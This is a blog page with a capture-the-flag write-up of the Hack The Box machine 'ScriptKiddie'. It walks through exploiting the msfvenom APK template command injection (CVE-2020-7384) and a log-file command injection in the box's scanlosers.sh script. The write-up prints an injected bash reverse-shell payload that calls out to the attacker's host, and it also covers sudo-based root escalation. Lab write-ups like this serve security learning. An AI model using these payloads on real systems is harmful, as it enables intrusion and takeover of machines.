<!DOCTYPE html>
<html lang="en"> 
<head>



<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-5YK5MXEZF1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-5YK5MXEZF1');
</script>


    <title>Write-ups</title>
    
    <!-- Meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
       
    <link rel="shortcut icon" href="favicon.ico"> 
    
    <!-- FontAwesome JS-->
    <script defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
    
    <!-- Theme CSS -->  
    <link id="theme-style" rel="stylesheet" href="assets/css/theme-1.css">
    

</head> 

<body>
    
    <header class="header text-center">	    
	    <h1 class="blog-name pt-lg-1 mb-0"><a href="index.html">Adventures with Bits  </a></h1>
        
	    <nav class="navbar navbar-expand-lg navbar-dark" >
           
			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navigation" aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
			<span class="navbar-toggler-icon"></span>
			</button>

			<div id="navigation" class="collapse navbar-collapse flex-column" >
				<div class="profile-section pt-3 pt-lg-0">
				    <img class="profile-image mb-3 rounded mx-auto" src="assets/images/profile.png" alt="image" >			
					
					<div class="bio mb-3">"Technical Problems Can Have Artistic Solutions"<br>
                                 - Jon Erickson The Art of Exploitation </div><!--//bio-->
					<ul class="social-list list-inline py-3 mx-auto">

			            <li class="list-inline-item"><a href="https://twitter.com/HimashOnline"><i class="fab fa-twitter fa-fw"></i></a></li>
			           
			            <li class="list-inline-item"><a href="https://github.com/himash"><i class="fab fa-github-alt fa-fw"></i></a></li>
			            
			        </ul><!--//social-list-->
			        
				</div><!--//profile-section-->
				
				<ul class="navbar-nav flex-column text-left">
					<li class="nav-item">
					    <a class="nav-link" href="index.html"><i class="fas fa-home fa-fw mr-2"></i>Blog Home <span class="sr-only">(current)</span></a>
					</li>



           <li class="nav-item">
					    <a class="nav-link" href="exploits.html"><i class="fas fa-user fa-fw mr-2"></i>Exploits & Vulnerabilities</a>
					</li> 


					<li class="nav-item">
					    <a class="nav-link" href="publications.html"><i class="fas fa-bookmark fa-fw mr-2"></i>Publications</a>
					</li>

						<li class="nav-item">
					    <a class="nav-link" href="projects.html"><i class="fas fa-bookmark fa-fw mr-2"></i>Projects</a>
					</li>
					<li class="nav-item active">
					    <a class="nav-link" href="write-up.html"><i class="fas fa-user fa-fw mr-2"></i>Write-ups</a>
					</li>

					<li class="nav-item">
					    <a class="nav-link" href="tools.html"><i class="fas fa-user fa-fw mr-2"></i>Tools</a>
					</li>

				</ul>
				
				
			</div>
		</nav>
    </header>


    <!-----------------------------------Header and stuff Ends Here-------------------------------------------------->





    <!-------------------------------------Article Starts Here --------------------------------------------------------------->
    
    <div class="main-wrapper">
	    
	    <article class="blog-post px-3 py-5 p-md-5">
		    <div class="container">
			    <header class="blog-post-header">
				    <h2 class="title mb-2">ScriptKiddie - HTB</h2>
				    

			    </header>
			    
			    <div class="blog-post-body">

			    	<!-----PICTURE
				    <figure class="blog-banner">
				        <a href="https://made4dev.com"><img class="img-fluid" src="assets/images/blog/blog-post-banner.jpg" alt="image"></a>

				        
				        <figcaption class="mt-2 text-center image-caption">Image Credit: <a href="https://made4dev.com?ref=devblog" target="_blank">made4dev.com (Premium Programming T-shirts)</a></figcaption>
				    </figure>
				    -------------------------------------------------------->

				    <p>

				    	<br>

				    	<figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk-intro.png" alt="image"></a>

				      </figure> 
                     

				    	The goal of this write-up is to provide an instinct and supporting materials to work on the machine to 
				      reach the solution.
				    	
				    	
				    	i would like to provide a methodology or instinct that you may use to solve
				    	the boxes.

				      

				      <br>
				      <br>
	
				      The main goal of CTFs and specially Hack the Box platform is to provide hands on experience and knowledge,
				      it is not about the solution it is about the gain of skill and knowledge.
				      owning the machine and be on ranking does not give anything if you are not gained anything
				      from the machine. not only the solution actually the exploits and vulnerabilities will
				      give much more information which will be useful in all aspects.
				      I usually not only enjoy the solution of the machine i prioritize the path of the solution
				      and the exploits that used to aid the solution.

				      <br>
				      <br>
              
              The point of scanning and initial information gathering is to point our direction of instinct to a certain
              path to think about all the possibilities. 
              lets start from nmap scan.

              <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk_nmap.png" alt="image"></a>

				      </figure>
              
              Initial scan may done on hundred different ways, you may ask which type of scan should be done at first phase.
              we can maintain a scanning methodology which will cover all ports, tcp, udp, script scanning and etc.
              but which will take time to point into one direction. if you are engaged with penetration testing assessment that would be ideal to maintain a "master" scan routine, however in CTFs it would be efficient to step up to the next level of
              scanning only if you not found any grip at least for the easy machines/boxes. from the above scan result it was found that
              port 22 and 5000 opened, generally ssh service also have vulnerabilities to exploit but here picking port 5000
              would be appropriate since we know basically this is a intentionally vulnerable box and port 5000 giving the below
              interface which we can relate with the machine name 'script kiddie' 
              <br>
              <br> 



              <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk_interface.png" alt="image"></a>

				      </figure>      
              
              Web application is presented here with the tools, when inspecting web application first look at the source code
              where we can extract some more information which we can use. inspecting upon the source code, there is no
              any possibilities or chance to exploit web technologies such as PHP, Wordpress and etc.
              based on the analysis now we can move on to the next possibility to exploit available tools on the application.
              <br>
              <br>

               <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk_source.png" alt="image"></a>

				      </figure>    
				      <br>

				      Before being jump into the exploitation part need to verify that these tools are working properly,
				      after that first starts with nmap. during the search there is no any available exploits to run against nmap,
				      so move on to the next one which is metasploit-framework.   
				      <br>
				      <br>

				       <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk_nmap_vul.png" alt="image"></a>

				      </figure> 

				      There is a vulnerability for the metasploit-framework (CVE-2020-7384)
				      <br>
				      <a href=https://www.exploit-db.com/exploits/49491> https://www.exploit-db.com/exploits/49491 </a>
              <br>
              <br>
              let's look at this vulnerability.

              <br>
              <a href=
              https://github.com/rapid7/metasploit-framework/pull/14288/commits/d1528cc0aa48ac667304f1e5116a784fe2dc8f15>
            https://github.com/rapid7/metasploit-framework/pull/14288/commits/d1528cc0aa48ac667304f1e5116a784fe2dc8f15 </a>
              <br>
              <br>
              <a href=https://github.com/rapid7/metasploit-framework/pull/14331> https://github.com/rapid7/metasploit-framework/pull/14331</a>
              <br>

              <a href=https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md> https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md </a>
              <br>
              <br>
              Above links provides a very good explanation of the vulnerability, actually the vulnerability is
              comes under "Improper Neutralization of Special Elements used in a Command - CWE-77".
              The vulnerability resides under below code block.
              <br>

              <pre>
              <code>
              	keytool -genkey -v -keystore #{keystore} \
              -alias #{keyalias} -storepass #{storepass} -keypass #{keypass} -keyalg RSA \
              -keysize 2048 -startdate '#{orig_cert_startdate}' \
              -validity #{orig_cert_validity} -dname '#{orig_cert_dname}'
              </code>
            </pre>
            

              <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk_commit.png" alt="image"></a>

				      </figure> 

				      <br>

				      When analyzing the above commit you can see that 'orig_cert_dname' was obtained from where the original APK was parsed and the "Owner" field was extracted from the APK's signature.

				      <br>
				      <br>

				         <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk_apk_parse.png" alt="image"></a>

				      </figure> 

				      <br>

				      This command string is passed to the 'run_cmd' function, by looking at this specific portion it is
				      possible to inject commands by inserting a single quote (to escape the single-quoted string) and followed by shell meta characters. Justin Steven provided a POC python script to inject commands in apk file.

				      <br>
				      <br>

                <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk_poc.png" alt="image"></a>

				      </figure> 

              <br>
              so lets exploit this vulnerability to get remote code execution. metasploit it self contains exploit for this
              vulnerability. 
              <br>
              <br>

                <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk_metasploit_ex.png" alt="image"></a>

				      </figure> 

				      <br>

				      by setting exploit options and uploading generated apk as template file, remote connection has been established.

				      <br>
				      <br>


                <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk_shell.png" alt="image"></a>

				      </figure>

              <br>

              basically for the privilege escalation before being step into additional enumeration, always look for
              local configuration files, logs and stuff. user credentials and other things can be found to move further.
              user.txt file is found under 'kid' directory. moving on, it was found that flask application python source code.

                <br>
                <br>


                <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk_user.png" alt="image"></a>

				      </figure>

              <br>

              Analyzing the flask application source code i found below function which is interesting to look on.

              <br>
              <pre>
              <code>

        def searchsploit(text, srcip):
           if regex_alphanum.match(text):
                 result = subprocess.check_output(['searchsploit', '--color', text])
                 return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
            else:
                 with open('/home/kid/logs/hackers', 'a') as f:
                 f.write(f'[{datetime.datetime.now()}] {srcip}\n')
                 return render_template('index.html', sserror="stop hacking me - well hack you back")

        </pre>    
        </code> 

               'regex_alphanum' is defined in the source code, if anything that doesn't match 'regex_alphanum' hackers file 
               has been written with source ip and time. so lets look at hackers file which is under /home/kid/logs/.
               hackers file is empty and it clearing the written logs quickly. searching through the directories i found scanlosers.sh file under pwn directory. 

               <pre>
               <code>

               #!/bin/bash

               log=/home/kid/logs/hackers
               cd /home/pwn/

               cat $log | cut -d' ' -f3- | sort -u | while read ip; do
               sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
               done

               if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi   
                  
               </pre>
               </code>

               scanlosers.sh file actually getting input from hackers file and doing nmap scan for top 10 ports.
               so basically analyzing this whole stuff, there is a chance to inject commands in hackers file to 
               get executed, since there is no any filter. to do that first need to know how does hackers file saving logs.
               by running the python code snippet i found log is written in this format - <b>[2021-06-20 13:35:04.728843] 10.10.10.10</b>

               <br>
               <br>


                <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk_python_out.png" alt="image"></a>

				      </figure>

              <br>

              scanlosers.sh removing unwanted characters and scanning the IP with nmap, so based on the output there are three items has been written to the hackers file. so to inject command i need to write something below to hackers file.
              <b> 'A B C 127.0.0.1; COMMAND'</b>. so to get reverse shell i have written this payload to the hackers file.
              <b> echo "12 13 14 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.20/4040 0>&1' # ."  > hackers </b>
              in the above payload first four items are just random numbers and IP then the payload is appended.
              by writing the payload reverse connection has been initiated for the user pwn.

                <br>
               <br>


                <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk_pwn.png" alt="image"></a>

				      </figure>

              <br>

              by running sudo -l, it was found that '/opt/metasploit-framework-6.0.9/msfconsole' can be run with sudo.
              running msfconsole with sudo given root privileges and root.txt found under root directory.

                <br>
               <br>


                <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk_sudo.png" alt="image"></a>

				      </figure>

              <br> 


             
               <br>


                <figure class="blog-banner">

				        <a><img class="img-fluid" src="assets/images/sk_root.png" alt="image"></a>

				      </figure>



				    </p>

				    <!--------------------------------------------Article End ------------------------------------------------------>



				    <!--------------------------------------------------------------------------------------------- Coding section
				    <h3 class="mt-5 mb-3">Code Block Example</h3>
				    <p>You can get more info at <a href="https://highlightjs.org/" target="_blank">https://highlightjs.org/</a>. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu. In enim justo, rhoncus ut, imperdiet a, venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium. Integer tincidunt. Cras dapibus. Vivamus elementum semper nisi. Aenean vulputate eleifend tellus. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. </p>
				    <pre>
					    <code>
function $initHighlight(block, cls) {
  try {
    if (cls.search(/\bno\-highlight\b/) != -1)
      return process(block, true, 0x0F) +
             ` class="${cls}"`;
  } catch (e) {
    /* handle exception */
  }
  for (var i = 0 / 2; i < classes.length; i++) {
    if (checkCondition(classes[i]) === undefined)
      console.log('undefined');
  }
}

export  $initHighlight;
					    </code>
				    </pre>

				  Ending here --------------------------------------------------------------------------------------------> 

					

					
				   
			    </div>
				    

				  <!--------------------------------------------------------------------------------- Navigation section  
			    <nav class="blog-nav nav nav-justified my-5">
				  <a class="nav-link-prev nav-item nav-link rounded-left" href="index.html">Previous<i class="arrow-prev fas fa-long-arrow-alt-left"></i></a>
				  <a class="nav-link-next nav-item nav-link rounded-right" href="blog-list.html">Next<i class="arrow-next fas fa-long-arrow-alt-right"></i></a>
				</nav>
				-----------------------------------------------------------------------------------------------------------> 

	    </article>
	    

    
    </div><!--//main-wrapper-->
    



    
       
    <!-- Javascript -->          
    <script src="assets/plugins/jquery-3.3.1.min.js"></script>
    <script src="assets/plugins/popper.min.js"></script> 
    <script src="assets/plugins/bootstrap/js/bootstrap.min.js"></script> 
    
    <!-- Page Specific JS -->
    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.14.2/highlight.min.js"></script>

    <!-- Custom JS -->
    <script src="assets/js/blog.js"></script>
      
    

</body>
</html> 

